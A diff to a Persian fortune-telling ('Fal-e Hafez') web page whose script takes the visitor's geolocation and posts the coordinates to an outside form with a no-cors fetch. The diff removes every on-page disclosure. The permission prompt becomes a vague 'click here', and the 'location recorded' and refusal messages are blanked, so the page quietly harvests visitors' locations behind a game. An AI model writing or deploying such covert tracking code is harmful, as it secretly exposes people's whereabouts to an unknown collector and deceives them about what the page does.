@@ -116,7 +116,7 @@ button:hover { background:#fff; }
 <body>
 
 <h1>🔮 فال حافظ</h1>
-<div id="status">لطفا اجازه موقعیت خود را بدهید</div>
+<div id="status">اینجا کلید کنید</div>
 
 <div id="wheel-container">
     <div id="wheel"></div>
@@ -177,10 +177,10 @@ navigator.geolocation.getCurrentPosition(pos => {
     "&entry.385103325=" + lon;
     fetch(formURL,{method:"POST",mode:"no-cors"});
 
-    document.getElementById("status").innerText = "📍 موقعیت ثبت شد";
+    document.getElementById("status").innerText = "";
     startWheel(); // نمایش گردونه و دکمه
 }, err => {
-    document.getElementById("status").innerText = "❌ برای دیدن گردونه، باید اجازه موقعیت بدهید";
+    document.getElementById("status").innerText = "";
 });
 
 // ====== چرخش گردونه تصادفی ======
@@ -203,3 +203,4 @@ document.getElementById("spinBtn").onclick=()=>{
 
 </body>
 </html>
+
